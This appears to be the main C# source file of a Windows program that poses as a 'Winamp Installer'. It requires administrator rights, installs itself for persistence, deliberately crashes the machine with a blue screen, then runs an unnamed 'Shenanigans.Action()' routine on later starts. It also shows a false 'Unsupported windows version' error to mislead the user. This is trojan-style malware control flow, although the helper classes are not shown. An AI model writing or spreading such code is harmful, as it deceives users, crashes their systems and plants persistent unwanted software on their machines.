using Project.Classes;
using System;
using System.Threading;
using System.Windows.Forms;

namespace Project
{
    internal class Program
    {
        static void Main()
        {
            if (Persistency.IsRunningInstalled())
            {
                Shenanigans.Action();
            }
            else if (Shenanigans.IsAdministrator())
            {
                if (!Persistency.IsInstalled())
                {
                    Persistency.Install();
                    Shenanigans.TriggerBSOD();
                }
            }
            else
            {
                MessageBox.Show("This application can only be ran as Administrator!", "Winamp Installer - Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            if (Persistency.IsInstalled() && !Persistency.IsRunningInstalled())
            {
                MessageBox.Show("Unsupported windows version.", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}